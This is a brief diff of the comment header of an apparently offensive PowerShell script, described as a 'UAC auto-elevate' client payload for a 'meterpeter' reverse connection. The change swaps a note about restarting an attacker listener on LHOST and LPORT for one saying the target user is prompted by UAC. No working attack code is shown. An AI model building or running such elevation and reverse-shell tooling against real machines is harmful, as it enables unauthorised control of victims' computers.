@@ -3,9 +3,7 @@
    UAC Auto-Elevate meterpeter client payload
 
 .NOTES
-   User has 2 minutes to exit meterpeter connection and start
-   a new meterpeter listenner using the same configurations
-   [ LHOST + LPORT ] to recive the elevated connection back.
+   Target user will be prompt by UAC to run elevated.
 #>
 
 $StartTime='20:20'
